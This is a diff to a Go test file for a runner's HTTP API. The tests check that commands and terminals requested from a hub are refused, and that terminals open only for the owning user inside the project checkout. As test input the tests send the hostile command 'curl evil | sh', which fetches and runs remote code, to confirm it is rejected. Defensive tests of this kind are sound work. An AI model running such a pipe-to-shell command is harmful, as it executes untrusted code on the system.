@@ -1,6 +1,7 @@
 package api
 
 import (
+	"encoding/json"
 	"net/http"
 	"net/http/httptest"
 	"path/filepath"
@@ -79,7 +80,7 @@ func TestRunnerRefusesCommandsFromTheHub(t *testing.T) {
 	if w := hubCall(h, "POST", procs, `{"kind":"task","command":"curl evil | sh"}`); w.Code != http.StatusForbidden {
 		t.Fatalf("ad-hoc command: %d %s", w.Code, w.Body)
 	}
-	if w := hubCall(h, "POST", procs, `{"kind":"pty"}`); w.Code != http.StatusForbidden {
+	if w := hubCall(h, "POST", procs, `{"kind":"pty"}`); w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "-hub-commands") {
 		t.Fatalf("terminal: %d %s", w.Code, w.Body)
 	}
 	if w := hubCall(h, "PATCH", "/api/projects/"+p.ID, `{"test_command":"curl evil | sh"}`); w.Code != http.StatusForbidden {
@@ -113,6 +114,66 @@ func TestRunnerRefusesCommandsFromTheHub(t *testing.T) {
 	s.HubCommands = true
 	if w := hubCall(h, "PATCH", "/api/projects/"+p.ID, `{"test_command":"make test"}`); w.Code != http.StatusOK {
 		t.Fatalf("-hub-commands: %d %s", w.Code, w.Body)
+	}
+}
+
+// With -hub-commands a runner opens terminals for the hub, but only for the
+// user who registered it (tunnel.UserHeader, which the hub sets and strips
+// from browsers' requests), and only in its project's checkout or a task's
+// worktree: the hub doesn't choose the folder.
+func TestRunnerOpensTerminalsForItsOwnerOnly(t *testing.T) {
+	s, h, p := runnerServer(t)
+	procs := "/api/projects/" + p.ID + "/processes"
+	as := func(user, method, path, body string) *httptest.ResponseRecorder {
+		r := httptest.NewRequest(method, path, strings.NewReader(body))
+		if user != "" {
+			r.Header.Set(tunnel.UserHeader, user)
+		}
+		w := httptest.NewRecorder()
+		h.ServeHTTP(w, r)
+		return w
+	}
+
+	if w := as("42", "POST", procs, `{"kind":"pty"}`); w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "-hub-commands") {
+		t.Fatalf("terminal without -hub-commands: %d %s", w.Code, w.Body)
+	}
+	s.HubCommands = true
+	if w := as("42", "POST", procs, `{"kind":"pty"}`); w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "register it again") {
+		t.Fatalf("terminal on a runner that doesn't know its owner: %d %s", w.Code, w.Body)
+	}
+	s.HubUser = 42
+	for _, user := range []string{"", "7"} {
+		if w := as(user, "POST", procs, `{"kind":"pty"}`); w.Code != http.StatusForbidden {
+			t.Fatalf("terminal for user %q: %d %s", user, w.Code, w.Body)
+		}
+	}
+	w := as("42", "POST", procs, `{"kind":"pty","command":"sleep 30","dir":"/etc","path":"/etc"}`)
+	if w.Code != http.StatusCreated {
+		t.Fatalf("terminal for the owner: %d %s", w.Code, w.Body)
+	}
+	var proc model.Process
+	if err := json.Unmarshal(w.Body.Bytes(), &proc); err != nil {
+		t.Fatal(err)
+	}
+	if proc.Dir != p.Path || proc.Kind != model.ProcPTY {
+		t.Fatalf("terminal: %+v, want it in %s", proc, p.Path)
+	}
+
+	// Attaching: the owner only.
+	srv := httptest.NewServer(h)
+	defer srv.Close()
+	for user, ok := range map[string]bool{"": false, "7": false, "42": true} {
+		hdr := http.Header{}
+		if user != "" {
+			hdr.Set(tunnel.UserHeader, user)
+		}
+		ws, _, err := websocket.DefaultDialer.Dial("ws"+strings.TrimPrefix(srv.URL, "http")+"/ws/proc/"+proc.ID, hdr)
+		if (err == nil) != ok {
+			t.Errorf("attaching as %q: %v", user, err)
+		}
+		if err == nil {
+			ws.Close()
+		}
 	}
 }
 
